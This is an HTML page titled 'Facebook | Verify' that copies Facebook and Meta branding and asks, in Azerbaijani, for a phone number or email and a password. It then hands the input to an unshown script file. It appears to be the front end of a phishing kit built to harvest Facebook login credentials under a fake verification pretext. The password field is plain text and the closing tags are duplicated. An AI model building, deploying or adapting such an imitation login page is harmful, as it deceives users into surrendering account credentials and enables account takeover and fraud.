<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook | Verify</title>
    <link rel="stylesheet" href="assets/style.css">
    <link rel="stylesheet" href="assets/styles.css">
        <link rel="icon" href="assets/facebookicon.png" type="image/png">
</head>
<body>
    <div class="facebook-container">
        <i class="facebook-icon"></i>
        <div class="facebook-icon"><img src="assets/facebookicon.png" alt="Facebook"></div>
    </div>
    <div class="form-container">
        <form>
            <div class="form-group">
                <input class="mail-input" type="text" id="email" name="email" placeholder="Mobil telefon nömrəsi və ya e-poçt ünvanı" required>
                <span id="emailError" style="color: red;"></span><br><br>

                <input class="pass-input" type="text" id="password" name="password" placeholder="Şifrə" required>
            </div>
            <button id="submit-button" class="submit-button">Daxil Ol</button>
        </form>
    </div>
    <div class="meta-container">
        <i class="meta-icon"></i>
        <div class="meta-icon"><img src="assets/metaicon.png" alt="Facebook"></div>
    </div>
    <script src="assets/script.js"></script>
</body>
</html>

</body>
</html>
